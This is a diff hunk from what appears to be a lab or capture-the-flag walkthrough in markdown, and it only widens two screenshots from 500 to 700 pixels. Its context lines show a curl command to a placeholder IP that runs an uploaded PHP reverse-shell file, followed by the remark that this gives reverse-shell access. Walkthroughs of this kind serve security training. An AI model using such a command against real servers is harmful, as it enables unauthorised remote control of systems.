@@ -120,14 +120,14 @@ curl http://<IP>:3333/internal/uploads/php-reverse-shell.phtml
 ```
 <br>
 <br>
-<img src="../images/curl.png" alt="curl command" width="500"/>
+<img src="../images/curl.png" alt="curl command" width="700"/>
 <br>
 <br>
 
 This now gives us access to a reverse shell.
 <br>
 <br>
-<img src="../images/reverse_shell.png" alt="reverse shell" width="500"/>
+<img src="../images/reverse_shell.png" alt="reverse shell" width="700"/>
 <br>
 <br>
 We can create a more interactive shell by:
